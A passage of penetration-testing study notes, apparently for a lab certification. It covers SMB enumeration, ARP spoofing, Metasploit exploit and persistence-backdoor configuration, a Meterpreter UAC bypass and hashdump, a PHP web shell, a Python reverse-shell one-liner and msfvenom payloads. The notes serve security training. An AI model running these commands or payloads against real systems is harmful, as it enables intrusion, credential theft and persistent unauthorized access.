# => samrdump
# It's under : /usr/share/doc/python-impacket-doc/examples
python samrdump <IP>

# => nmap
nmap -script=smb-enum-shares <IP>
nmap -script=smb-brute <IP>
```

Use samba in Kali:

```bash
> vi /etc/samba/smb.conf

# Under [global]
client min protocol = CORE
client max protocol = SMB3
client use spnego = no
client ntlmv2 auth = no

# Get file shares using smbclient
smbclient -L WORKGROUP -I <IP> -N -U ""

# Access to a folder
smbclient \\\\<IP>\\WorkSharing -N
smb: \> ls
smb: \> get flag.txt /home/kali/Desktop/flag.txt
```

### ARP Poisoning

If an attacker finds a way to manipulate the ARP cache, then the attacker will also be able to receive traffic destined to other IP addresses.

> Ability to:
>
> * Perform MITM attacks.
> * Mount advanced attacks.
> * Sniff traffic on a switched network.

* The attacker can manipulate other hosts' ARP cache tables by sending gratuitous ARP replies.
* Gratuitous ARP replies = ARP reply messages.
* The attacker exploits gratuitous ARP messages to tell the victims that they can reach a specific IP address at the attacker's machine MAC address.
* The operation is performed on every victim.
* As soon as the ARP cache table contains fake info, every packet of every communication between the poisoned nodes will be sent to the attacker's machine.
* The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so.
* This kind of attack can be used on an entire network and against a router, letting the attacker intercept the communication between a LAN and the internet.

#### Dsniff Arpspoof

Collection of tools for network auditing and penetration testing, including `arpspoof`, designed to intercept traffic on a switched LAN. `arpspoof` redirects packets from a target host \(or all hosts\) on the LAN intended for another host on the LAN by forging ARP replies.

Before running the tool, you have to enable the _Linux Kernel IP Forwarding_, a feature that transforms a Linux box into a router. By enabling IP forwarding, you tell your machine to forward the packets you interecept to the real destination host:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

# right after you can run arpspoof
arpspoof -i <interface> -t <target> -r <host>
# target and hosts are the victims IP addresses

# => Example
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
```

### Metasploit

Metasploit is an open-source framework used for penetration testing and exploit development, giving a wide array of community contributed exploits and attack vectors that can be used against various systems. Extensible.

Basic workflow:

* Identifying a vulnerable service.
* Searching for a proper exploit for that service.
* Loading and configuring the exploit.
* Loading and configuring the payload you want to use.
* Running the exploit code and getting access to the vulnerable machine.

A payload is used by an attacker to get:

* An OS Shell.
* A VNC or RDP connection.
* A Meterpreter shell.
* The execution of an attacker-supplied application.

A special payload, with many useful features under the penetration testing point of view is `meterpreter`.

```bash
service postgresql start
msfconsole
> help
> show -h
> search <searchterm> # search for a specific module by using the search cmd
> search skeleton
> search turboftp
> show exploits # impractical to use
> use exploit/windows/ftp/turboftp_port # to use exploit for turboftp
> info
> show options
> back
> show payloads
> set payload windows/meterpreter/reverse_tcp
> exploit
```

```bash
# Exploit freeftpd
> use exploit/windows/ftp/freeftpd_pass
> set ftpuser anonymous
> set rhosts 192.168.99.12
> set rport 21
> set payload windows/meterpreter/reverse_tcp
> set exitfunc process
> set lhost 192.168.99.100
> set lport 4444
> exploit
# Get user
> getuid
# Obtain System privileges on the machine
> getsystem
```

```bash
# Set backdoor
use exploit/windows/local/persistence
set reg_name backdoor
set exe_name backdoor
set startup SYSTEM
set session 1
set payload windows/meterpreter/reverse_tcp
set exitfunc process
set lhost 192.168.99.100
set lport 5555
set DisablePayloadHandler false
exploit //if the backdoor doesn't start immediately, use "exploit -j" instead
```

### Meterpreter

> Ability to:
>
> * Get a powerful shell on an exploited machine
> * Take control over an exploited machine
> * Install backdoors

Provides advanced features to:

* Gather information.
* Transfer files between the attacker and victim machines.
* Install backdoors and more.
* `meterpreter` can both wait for a connection on the target machine or connect back to the attacker machine.
* A Meterpreter session is an advanced shell on the target machine.
* Most used configurations are:
  * _bind\_tcp_: runs a server process on the target machine that waits for connections from the attacker machine.
  * _reverse\_tcp_: performs a TCP connection back to the attacker machine \(helping to evade firewall rules\).

Inside a `msfconsole`:

```bash
> search meterpreter
> set payload windows/meterpreter/reverse_tcp
> exploit
> sessions -l # current opened sessions
> sessions -i 1 # resume session 1
> sysinfo # retrieve info about the exploited machine
> ifconfig # prints the network configuration
> route # routing info
> getuid # which user is running the process exploited
> getsystem # Runs a privilege escalation routine on the target machine

# Bypass UAC (User Account Control policy of modern Windows OSs)
> background # switch from a meterpreter session to the msf console
> search bypassuac
> use exploit/windows/local/bypassuac
> set session 1
> exploit
> getuid

# Dumping the Password Database
> background
> use post/windows/gather/hashdump
> set session 2
> exploit

# Upload / download files
> download HaxLogs.log /root/
> upload /root/backdoor.exe c:\\Windows # note the backslash escaping
> shell
```

```bash
# Is UAC enabled?
run post/windows/gather/win_privs
```

### Shells

```bash
system('ls');

echo 'ls';

passthru("ls");

# Python
import os
exit_code = os.system('ls')
output    = os.popen('ls').read()
```

Simple php shell:

```php
<html>
<?php
  echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></form>";
  system($_GET["cmd"]);
```

Reverse Shell is the most common one we'll use:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### msfvenom

```bash
# msfvenom
# => list payloads for linux
msfvenom --list payloads | grep x64 | grep linux | grep reverse

# => Generate Staged payload
msfvenom -p linux/x64/shell/reverse_tcp lhost=<attacker_IP> lport=443 -f elf -o r443
chmod +x r433

# => Generate Stagelesss payload
> msfvenom --list payloads | grep php | grep reverse
> msfvenom -p php/reverse_php lhost=<attacker_IP> lport=443 -o r443.php

# => Listener staged
$ msfconsole
> use exploit/multi/handler
> set payload linux/x64/shell/reverse_tcp # has to be exactly the same!
> set lhost 0.0.0.0
> set lport 443
> run # wait for session

# => Listener Stageless
> nc -lvp 4343
# or listen to in MSF with exact payload and the exploit/multi/handler


# Difference between:
#  linux/x64/shell/reverse_tcp
#  linux/x64/shell_reverse_tcp
#
# Staged: it's smaller. Not enough to create a shell itself. You require to use a msf listener.
# Stageless: it's bigger. It doesn't need anything aditional, just nc in your computer as a listener.
#
```

## Next Steps

### What to do Next - Study Guide

* Each BlackBox Penetration Testing labs contains 2-4 machines that should be exploited
* There are flags per machine
* There could be more valuable information on the machine that could help you compromise additional hosts

> Study and get updated, new exploitation techniques are being discovered daily, start a blog, read feeds.

### Penetration Testing Approach - Study Guide

* Be curious
* Don't be ashamed of not knowing
* Try various methods until you are sure something is really safe
* Use search engines
* You can't remember everything
* Follow some existing penetration testing methodology \(as OWASP\)
  * So you can show your client what tests will be conducted

    **Career Paths - Study Guide**
* Web App / Network penetration tester
* Red teamer / Social engineer
* Reverse engineer
* Security researcher
* Mobile application penetration tester

Defense:

* Incident Response team member
* CCERT analyst
* Malware analyst
* Threat hunter
* Secure software developer
* Network and systems defender

